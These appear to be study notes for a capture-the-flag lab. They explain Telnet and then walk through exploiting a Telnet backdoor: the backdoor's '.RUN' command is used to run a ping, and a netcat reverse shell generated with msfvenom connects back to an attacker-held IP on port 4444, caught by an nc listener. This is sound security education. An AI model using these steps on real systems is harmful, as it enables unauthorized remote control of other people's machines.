**What is Telnet?**
Telnet is an application protocol which allows you, with the use of a telnet client, to connect to and execute commands on a remote machine that's hosting a telnet server.

**Replacement**
Telnet sends all messages in clear text and has no specific security mechanisms. Thus, in many applications and services, Telnet has been replaced by ==ssh== where transmitted data is encrypted.

* Telnet and ssh are ==client-server== protocols
* The default port for the Telnet protocol is ==**TCP port 23**==

 **connecting to a Telnet server** 
 `telnet ip port`                ex `telnet 10.10.10.3 23`



# Exploit
### 1. Test whether the Telnet input does anything

You connect:

```bash
telnet 10.112.164.214 8012
```

You type commands, but you don't get normal output.

So the question is:

> Is this actually executing commands, or is it just accepting text?

---

### 2. Use `tcpdump` to detect a ping

On **your machine**, start:

```bash
sudo tcpdump ip proto \\icmp -i tun0
```

This listens for ICMP packets on your VPN interface.

Think of it as:

```text
"Tell me whenever someone sends an ICMP packet to/from my VPN interface."
```

---

### 3. Tell the backdoor to execute `ping`

Inside Telnet, you use:

```text
.RUN ping 192.168.147.77 -c 1
```

`192.168.147.77` is **your local THM VPN IP**.

The important part is `.RUN`.

The backdoor apparently interprets:

```text
.RUN <command>
```

as:

> Execute `<command>` as a system command.

So:

```text
.RUN ping 192.168.147.77 -c 1
```

means:

```text
Backdoor
   ↓
Execute ping
   ↓
Target sends ICMP packet
   ↓
192.168.147.77
   ↓
tcpdump sees it
```

If tcpdump sees the ping, you've proven **remote command execution**.

---

### 4. Generate a reverse-shell payload

Now that you know commands can execute, you want the target to connect **back to your machine**.

You generate the payload with:

```bash
msfvenom -p cmd/unix/reverse_netcat lhost=192.168.147.77 lport=4444 R
```

**msfvenom** is a tool from the **Metasploit Framework** used to **generate payloads**.
The important parts:

- `-p` → choose the payload
- `cmd/unix/reverse_netcat` → create a Netcat reverse shell
- `lhost=192.168.147.77` → **your machine's VPN IP**
- `lport=4444` → port on **your machine** that will receive the connection
- `R` → output the payload in raw format
    

The generated payload will be a command that basically says:

> "Target, connect back to `192.168.147.77:4444` and give me a shell."

---

### 5. Start your listener

Before executing the payload, your machine needs to wait for the incoming connection:

```bash
nc -lvnp 4444
```

Meaning:
- `-l` → listen
- `-v` → verbose
- `-n` → don't resolve DNS
- `-p 4444` → listen on port `4444`
    

So the final flow is:

```text
             TARGET
        10.112.164.214
              │
              │ Telnet :8012
              ▼
        SKIDY'S BACKDOOR
              │
              │ .RUN payload
              ▼
       Reverse shell
              │
              │ connects back
              ▼
      YOUR MACHINE
      192.168.147.77
          :4444
              │
              ▼
        nc listener
              │
              ▼
        Remote shell
```

